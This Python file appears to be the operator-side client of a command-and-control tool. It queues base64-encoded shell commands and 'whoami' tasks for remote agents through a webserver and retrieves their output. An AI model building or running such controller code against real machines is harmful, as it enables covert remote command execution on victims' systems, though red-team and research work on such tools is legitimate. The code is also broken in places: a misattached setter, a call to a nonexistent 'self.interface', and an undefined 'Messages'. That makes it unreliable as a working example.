import functools
import requests
import json
from base64 import b64decode, b64encode
from module.input_usage import InputUsage
from module.input_type import InputType
from module.module_exception import *
from module.interface_messages import InterfaceMessages
import subprocess
import importlib
import os

class Interface:
    def __init__(self, webserver, agent_uuid=""):
        self._webserver = webserver
        self._agent_uuid = agent_uuid

    @property
    def webserver(self):
        return self._webserver

    @property
    def agent_uuid(self):
        return self._agent_uuid

    @webserver.setter
    def agent_uuid(self, value):
        self._webserver = value

    @agent_uuid.setter
    def agent_uuid(self, value):
        self._agent_uuid = value

    def agent_uuid_required(func):
        @functools.wraps(func)  # Preserve metadata, namely the doc string
        def wrapper(self, *args, **kwargs):
            if not self._agent_uuid:
                return Messages.AGENT_UUID_REQUIRED
            return func(self, *args, **kwargs)
        return wrapper

    def api_get_req(self, endpoint: str, agent_uuid: str=""):
        """
        endpoint: /example
        uuid: agent_uuid
        """
        response_raw = requests.get(self._webserver + endpoint + agent_uuid).text
        response_json = json.loads(response_raw)
        return response_json

    def api_post_req(self, endpoint: str, post_data, agent_uuid: str=""):
        """
        endpoint: /example
        post_data: json data
        uuid: agent_uuid
        """
        print(self._webserver+''.join(endpoint))
        response_raw = requests.post(self._webserver + ''.join(endpoint) + agent_uuid, json=post_data).text
        return response_raw

    def create_task(self, task):
        """general function for creating tasks"""
        endpoint = "/create_task/"
        task_json = json.dumps(task)
        response = self.api_post_req(endpoint, task_json, self._agent_uuid)
        return response

    @agent_uuid_required
    def cmd(self, args):
        """create a new cmd task"""
        task = args
        b64EncodedTask = b64encode(task.encode())
        task = {
            "task": b64EncodedTask.decode(),
            "task_type": InputType.Cmd.value,    # cmd
            "agent_uuid": self._agent_uuid
        }

        return self.interface.create_task(task) + '\n'

    @agent_uuid_required
    def get_task_output(self):
        """return the output of the last task"""
        endpoint = "/get_task_output/"
        response_raw = requests.get(self._webserver + endpoint + self._agent_uuid).text
        response_json = json.loads(response_raw)
        if not response_json:
            return "No output"
        return b64decode(response_json[-1][-1]).decode()     # last result_text

    @agent_uuid_required
    def get_tasks(self):
        """list of all the agents"""
        endpoint = "/tasks/"
        tasks = self.api_get_req(endpoint, agent_uuid=self._agent_uuid)
        for task in tasks:
            task[1] = b64decode(task[1]).decode()    # decode command stored in b64

        if len(tasks) == 0:
            return InterfaceMessages.TaskQueueEmpty

        return tasks

    @agent_uuid_required
    def whoami(self):
        """get user info through GetUserName"""
        task = {
            "task": "",
            "task_type": InputType.Whoami.value,
            "agent_uuid": self._agent_uuid
        }

        return self.create_task(task) + '\n'

